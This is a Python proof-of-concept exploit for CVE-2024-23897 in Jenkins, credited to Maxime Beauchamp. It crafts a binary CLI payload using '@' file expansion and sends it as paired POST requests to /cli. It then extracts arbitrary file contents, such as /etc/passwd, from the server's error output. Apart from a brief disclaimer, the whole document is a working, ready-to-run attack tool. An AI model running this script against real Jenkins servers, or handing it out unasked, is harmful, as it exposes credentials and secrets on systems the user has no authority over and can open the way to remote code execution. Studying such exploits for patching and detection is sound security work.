"""
Proof of Concept (PoC)
CVE ID: CVE-2024-23897
Vulnerability Type: Arbitrary File Read Vulnerability
Affected Product: Jenkins 2.441 and earlier, LTS 2.426.2 and earlier
Impact: Allows unauthenticated attackers to read arbitrary files on the Jenkins controller file system, potentially leading to RCE (Remote Code Execution).
Researcher: Maxime Beauchamp (Octomany)
Inspired by Original PoC by: binganao (https://github.com/binganao/CVE-2024-23897/blob/main/poc.py)
Website: https://www.maximebeauchamp.com

Description:
This PoC, inspired by binganao's original work, demonstrates the exploitation of CVE-2024-23897, a critical security vulnerability in Jenkins. By exploiting this vulnerability, attackers can perform unauthorized file read operations on the Jenkins controller's file system. This vulnerability may lead to sensitive information disclosure and potentially facilitate Remote Code Execution (RCE).

Requirements:
- Python 3.x
- Access to the vulnerable Jenkins instance

Usage:
python POC_CVE-2024-23897.py -u <target_url> -f <file_path> [--debug]

The '--debug' flag enables detailed output, showing full request and response data.

Disclaimer:
This PoC is intended for educational purposes or authorized testing only. Its usage might have legal and ethical implications. The creator assumes no liability for any misuse or damage.
"""

import argparse
import threading
import http.client
import time
import uuid
import urllib.parse
import sys
import struct

def display_banner():
    banner = """
     ██████╗  ██████╗████████╗ ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗██╗   ██╗
    ██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗████╗  ██║╚██╗ ██╔╝
    ██║   ██║██║        ██║   ██║   ██║██╔████╔██║███████║██╔██╗ ██║ ╚████╔╝ 
    ██║   ██║██║        ██║   ██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║  ╚██╔╝  
    ╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   
     ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
                    
    CVE-2024-23897 Exploitation
    By Maxime Beauchamp - https://www.maximebeauchamp.com
    """
    print(banner)

# Ajout des codes de couleur pour les sorties
GREEN = "\033[92m"
ENDC = "\033[0m"

class OperationCode:
    """Enumeration class for operation codes used in constructing the exploit data."""
    ARG = 0
    LOCALE = 1
    ENCODING = 2
    START = 3
    EXIT = 4
    STDIN = 5
    END_STDIN = 6
    STDOUT = 7
    STDERR = 8

def construct_exploit_data(filepath):
    """Construct the byte sequence for the exploit based on the given filepath."""
    print("Constructing exploit data...")
    text_bytes = ('@' + filepath).encode('utf-8')
    length_prefix = struct.pack('>H', len(text_bytes))
    req_data = bytes([OperationCode.ARG]) + length_prefix + text_bytes
    exploit_data = (b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00' +
                    struct.pack('!B', len(req_data) - 1) +
                    req_data +
                    b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03')
    return exploit_data

def parse_response(response, debug):
    """Parse and format the response for readability."""
    if debug:
        print(response)
    else:
        print("Parsing and formatting response...")
        try:
            decoded_response = response.decode('utf-8')
            extracted_lines = []
            for pattern, prefix_length in [("COMMAND : Name of the command (default:", 0),
                                           ("ERROR: Too many arguments:", 0)]:
                start = decoded_response.find(pattern) + len(pattern) + prefix_length
                end = decoded_response.find("\x00", start) if pattern.startswith("ERROR") else decoded_response.find(")", start)
                extracted_lines.append(decoded_response[start:end].strip())

            formatted_output = "\n".join(extracted_lines)
            return f"{GREEN}Exploit output:\n{formatted_output}{ENDC}"
        except ValueError:
            return "Could not extract specific information; check the response format."

def send_request(target, session_id, side, data=None, debug=False):
    """Send an HTTP request to the target with the specified parameters and improve output readability."""
    print(f"Sending {side} request...")
    conn = http.client.HTTPConnection(target.netloc)
    headers = {"Session": session_id, "Side": side}
    if data:
        headers["Content-type"] = "application/octet-stream"
        conn.request("POST", "/cli?remoting=false", headers=headers, body=data)
    else:
        conn.request("POST", "/cli?remoting=false", headers=headers)

    response = conn.getresponse().read()
    formatted_response = parse_response(response, debug)
    print(formatted_response)

def main(target_url, filepath, debug):
    session_id = str(uuid.uuid4())
    target = urllib.parse.urlparse(target_url)

    data_bytes = construct_exploit_data(filepath)

    if debug:
        print(f"Debug mode: exploit data {data_bytes}\n")

    download_thread = threading.Thread(target=send_request, args=(target, session_id, "download", None, debug))
    upload_thread = threading.Thread(target=send_request, args=(target, session_id, "upload", data_bytes, debug))

    download_thread.start()
    time.sleep(0.3)  # Assurez-vous que la demande de téléchargement initie avant le téléversement
    upload_thread.start()

    download_thread.join()
    upload_thread.join()

if __name__ == "__main__":
    display_banner()
    parser = argparse.ArgumentParser(description='Exploit script with enhanced output formatting.')
    parser.add_argument('-u', '--url', required=True, help='URL of the Jenkins instance to exploit. Include http:// or https://.')
    parser.add_argument('-f', '--file', required=True, help='File name to exploit/read on the target system.')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode to show full request and response details.')
    args = parser.parse_args()

    if len(sys.argv) < 3:
        print('[*] Usage: python script.py --url http://127.0.0.1:8888/ --file /etc/passwd [--debug]')
        sys.exit(1)

    main(args.url, args.file, args.debug)
